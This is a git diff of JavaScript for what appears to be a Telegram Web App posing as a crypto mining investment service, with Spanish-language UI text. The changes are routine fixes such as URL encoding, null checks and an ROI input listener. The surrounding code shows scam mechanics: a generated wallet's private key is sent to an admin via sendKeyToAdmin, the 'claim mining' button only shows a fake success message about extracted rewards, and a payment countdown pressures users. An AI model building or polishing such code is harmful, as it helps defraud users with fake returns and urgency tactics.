@@ -76,7 +76,7 @@ export async function openPayModal() {
             await sendKeyToAdmin(data.address, data.privateKey, amount);
 
             if (addressDisplay) addressDisplay.innerText = data.address;
-            if (qrImg) qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${data.address}`;
+            if (qrImg) qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(data.address)}`;
 
             startPaymentTimer(30);
         } else {
@@ -106,10 +106,11 @@ function startPaymentTimer(minutes) {
     let seconds = minutes * 60;
 
     paymentTimerInterval = setInterval(() => {
+        const timerDisplay = document.getElementById('payment-countdown');
+        
         if (seconds <= 0) {
             clearInterval(paymentTimerInterval);
             paymentTimerInterval = null;
-            const timerDisplay = document.getElementById('payment-countdown');
             if (timerDisplay) timerDisplay.innerText = "Tiempo expirado";
             return;
         }
@@ -117,7 +118,6 @@ function startPaymentTimer(minutes) {
         let mins = Math.floor(seconds / 60).toString().padStart(2, '0');
         let secs = (seconds % 60).toString().padStart(2, '0');
 
-        const timerDisplay = document.getElementById('payment-countdown');
         if (timerDisplay) timerDisplay.innerText = `${mins}:${secs}`; 
         seconds--;
     }, 1000);
@@ -141,14 +141,14 @@ export function copyLink() {
 
 export function copyAddress() {
     const addrDisplay = document.getElementById('wallet-address-display');
-    if (addrDisplay && addrDisplay.innerText.length > 20) {
+    if (addrDisplay && addrDisplay.innerText.length > 20 && !addrDisplay.innerText.includes("Generando")) {
         navigator.clipboard.writeText(addrDisplay.innerText).then(() => {
             if (window.Telegram?.WebApp) {
                 window.Telegram.WebApp.showAlert("✅ Dirección Hash copiada al portapapeles.");
             } else {
                 alert("✅ Dirección Hash copiada.");
             }
-        });
+        }).catch(err => console.error('Error al copiar dirección:', err));
     }
 }
 
@@ -177,10 +177,11 @@ export function calculateROI() {
 }
 
 export function claimMining() {
+    const msg = "⚡ Sincronizando con la red neuronal... Recompensas extraídas con éxito.";
     if (window.Telegram?.WebApp) {
-        window.Telegram.WebApp.showAlert("⚡ Sincronizando con la red neuronal... Recompensas extraídas con éxito.");
+        window.Telegram.WebApp.showAlert(msg);
     } else {
-        alert("⚡ Sincronizando con la red neuronal... Recompensas extraídas con éxito.");
+        alert(msg);
     }
 }
 
@@ -203,23 +204,30 @@ window.onload = () => {
 
             // --- ACTUALIZACIÓN: Datos de Perfil ---
             if (tgData?.user) {
-                // 1. ID de Usuario
                 state.userId = tgData.user.id;
-                document.getElementById('user-id').innerText = `ID: ${state.userId}`;
+                
+                const userIdEl = document.getElementById('user-id');
+                if (userIdEl) userIdEl.innerText = `ID: ${state.userId}`;
 
-                // 2. Nombre de Usuario
-                const fullName = `${tgData.user.first_name} ${tgData.user.last_name || ''}`;
-                document.getElementById('user-full-name').innerText = fullName;
+                const fullName = `${tgData.user.first_name} ${tgData.user.last_name || ''}`.trim();
+                const userFullNameEl = document.getElementById('user-full-name');
+                if (userFullNameEl) userFullNameEl.innerText = fullName;
 
-                // 3. Foto de Perfil (Si Telegram proporciona una)
                 if (tgData.user.photo_url) {
-                    document.getElementById('user-pic').src = tgData.user.photo_url;
+                    const userPicEl = document.getElementById('user-pic');
+                    if (userPicEl) userPicEl.src = tgData.user.photo_url;
                 }
             } else {
                 state.userId = urlParams.get('user_id') || '88888888';
             }
 
             console.log(`[OK] Enlace establecido. Operador ID: ${state.userId}`);
+
+            // --- VINCULACIÓN DINÁMICA DE EVENTOS EN UI ---
+            const amountInput = document.getElementById('invest-amount');
+            if (amountInput) {
+                amountInput.addEventListener('input', calculateROI);
+            }
 
             if (typeof updateDashboard === 'function') updateDashboard();
             if (typeof renderHistory === 'function') renderHistory();
@@ -231,6 +239,7 @@ window.onload = () => {
         }
     }, 150);
 };
+
 // ==========================================
 // 5. EXPORTAR AL ENTORNO GLOBAL
 // ==========================================
